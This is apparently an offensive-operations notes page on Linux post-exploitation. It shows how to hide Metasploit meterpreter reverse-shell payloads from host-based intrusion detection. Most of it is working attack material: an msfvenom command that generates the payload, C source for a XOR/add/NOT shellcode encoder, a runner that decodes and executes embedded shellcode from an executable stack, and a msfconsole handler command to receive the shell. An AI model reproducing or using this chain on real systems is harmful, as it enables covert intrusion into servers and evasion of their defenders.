---
title: Linux post-exploitation
tags:
  - breach
  - operations
  - linux
  - post
  - exploitation
  - bypass
  - antivirus
  - ids
  - ips
  - meterpreter
  - reverse
  - shellcode
---

Linux antivirus solutions aren't as robust as Windows, given that the market
share of Linux client machines is pretty small. Linux is primarily used for
servers and other network infrastructure. Regardless, we need to make sure we
take action to obfuscate our payloads so they don't get detected by host-based
**intrusion detection systems (IDS)**.

## Encoding payloads

The following discussion goes over using **xor-and-not-and-xor (XANAX)**
encoding for delivering **meterpreter** payloads. First, we'll generate a
`payload.c` file containing our meterpreter payload:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f c -o payload.c
```

We use the following `encoder.c` code to encode our meterpreter payload with a
four (4) byte XANAX key. We randomly generate this key, so don't use the same
one identified here:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef struct {
  unsigned char xor1;
  unsigned char add1;
  unsigned char xor2;
  unsigned char add2;
} xanax_keys;

static const xanax_keys keys = {.xor1 = 0xe,
                                .add1 = 0x75,
                                .xor2 = 0xbc,
                                .add2 = 0xc9};

static unsigned char buf[] =
    "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
    "\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51"
    "\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01"
    "\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00"
    "\x20\xfb\xc0\xa8\x2d\xbe\x51\x48\x89\xe6\x6a\x10\x5a\x6a"
    "\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74"
    "\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31"
    "\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58"
    "\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0"
    "\x78\xed\xff\xe6";

void main() {
  unsigned int buf_len = (unsigned int)sizeof(buf);

  for (unsigned int i = 0; i < buf_len; i++) {
    unsigned char e = buf[i];

    e ^= keys.xor1;
    e += keys.add1;
    e = ~e;
    e += keys.add2;
    e ^= keys.xor2;

    printf("\\x%02x", e);
  }
}
```

We build `encoder.c` by invoking the following:

```bash
gcc encoder.c -o encoder.out
```

Executing `encoder.out` will print our encoded meterpreter payload to the
terminal. We create our `runner.c` code, which will decode the encoded payload
with the same XANAX key and execute the buffer on the stack:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef struct {
  unsigned char xor1;
  unsigned char add1;
  unsigned char xor2;
  unsigned char add2;
} xanax_keys;

static const xanax_keys keys = {.xor1 = 0xe,
                                .add1 = 0x75,
                                .xor2 = 0xbc,
                                .add2 = 0xc9};

void main() {
  unsigned char buf[] =
      "\xa8\xde\x53\xf0\x41\x00\x27\x89\xb1\x70\xc7\xac\xa8\x30\x53\x9b\xb8\x43"
      "\x53\xf6\x43\xee\xf4\xb1\x74\x39\x61\x48\x53\xf3\xb8\x40\x49\x53\x90\x41"
      "\x00\x53\xfb\xbe\x53\xf8\xbf\xee\xf4\xb1\x74\x39\x61\xa2\xb1\x06\xb1\x20"
      "\xfb\xf9\x99\xe2\x39\x11\x8c\x1f\x48\xb1\x70\xd7\x53\x89\x43\x53\x93\x41"
      "\xee\xf4\x40\xb1\x74\x39\x60\x94\xb0\xde\x30\x65\x81\x46\x53\x9a\x41\x53"
      "\xf9\x53\xf4\xb1\x70\xd6\xb1\xa8\xe7\xee\xf4\x40\x40\xbe\xb1\x74\x39\x60"
      "\x36\x53\x9d\x41\x53\xf8\xbe\xee\xf4\xbf\x53\x5f\x43\xee\xf4\xb1\x74\x39"
      "\x61\xcc\xde\xd7\xf9";

  unsigned int buf_len = (unsigned int)sizeof(buf);

  for (unsigned int i = 0; i < buf_len; i++) {
    unsigned char e = buf[i];

    e ^= keys.xor2;
    e -= keys.add2;
    e = ~e;
    e -= keys.add1;
    e ^= keys.xor1;

    buf[i] = e;
  }

  ((void (*)())buf)();
}
```

We compile the `runner.c` ELF, making sure the stack is executable and
statically linking it so it can execute on the target:

```bash
gcc runner.c -o runner.out -z execstack -static
```

We can listen for this payload by invoking the following:

```bash
msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; exploit"
```
